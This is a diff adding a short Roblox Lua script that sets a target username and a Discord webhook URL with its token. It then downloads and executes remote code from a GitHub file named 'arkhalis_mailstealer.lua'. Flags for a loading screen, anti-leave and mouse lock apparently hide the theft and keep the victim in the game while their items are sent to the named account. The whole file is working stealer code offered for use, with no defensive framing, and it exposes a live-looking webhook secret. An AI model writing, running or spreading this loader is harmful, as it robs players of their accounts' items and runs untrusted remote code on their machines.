@@ -1,0 +1,13 @@
+UserName = "babygirlLunaa123" --//
+UserName2 = "babygirlLunaa123" --//
+
+
+Webhook = "https://discord.com/api/webhooks/1113072732364615760/WBW45FKze54hf5uE4KePzHTC8fIG76XyTCZ5lOu82GQruvmjIwOpu_iUSJ1HMlpDjzzX" --//
+
+
+_G.LoadingScreen = true --//
+_G.AntiLeave = true --//
+_G.MouseLock = true --// 
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Arkhalislua/Arkhalislua.github.io/999fe3c1fca3f1e6e053f901c11833ecf37e6a5b/arkhalis_mailstealer.lua", true))()
